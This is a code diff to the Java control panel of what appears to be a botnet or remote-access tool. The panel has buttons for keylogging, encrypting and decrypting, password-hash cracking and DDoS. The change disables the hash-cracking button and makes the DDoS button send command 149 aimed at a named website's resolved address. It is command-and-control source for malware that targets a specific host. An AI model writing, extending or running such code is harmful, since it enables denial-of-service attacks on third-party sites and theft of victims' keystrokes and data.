@@ -6,6 +6,8 @@ import java.awt.event.MouseEvent;
 import java.io.BufferedReader;
 import java.io.FileReader;
 import java.io.IOException;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 
 import javax.swing.BoxLayout;
 import javax.swing.JButton;
@@ -81,19 +83,23 @@ public class ActionPanel extends JPanel {
       }
     });
 
-    JButton hash = new JButton("Crack password hash");
-    hash.addMouseListener(new MouseAdapter() {
-      @Override
-      public void mouseClicked(MouseEvent e) {
-        server.sendCommand("148", null);
-      }
-    });
+//    JButton hash = new JButton("Crack password hash");
+//    hash.addMouseListener(new MouseAdapter() {
+//      @Override
+//      public void mouseClicked(MouseEvent e) {
+//        server.sendCommand("148", null);
+//      }
+//    });
 
     JButton dos = new JButton("DDoS");
     dos.addMouseListener(new MouseAdapter() {
       @Override
       public void mouseClicked(MouseEvent e) {
-        server.sendCommand("149", null);
+        try {
+          server.sendCommand("149", InetAddress.getByName("www.mattabullock.com").getHostAddress());
+        } catch (UnknownHostException uhe) {
+          uhe.printStackTrace();
+        }
       }
     });
 
@@ -103,7 +109,7 @@ public class ActionPanel extends JPanel {
     add(keylog);
     add(encrypt);
     add(decrypt);
-    add(hash);
+//    add(hash);
     add(dos);
   }
 }
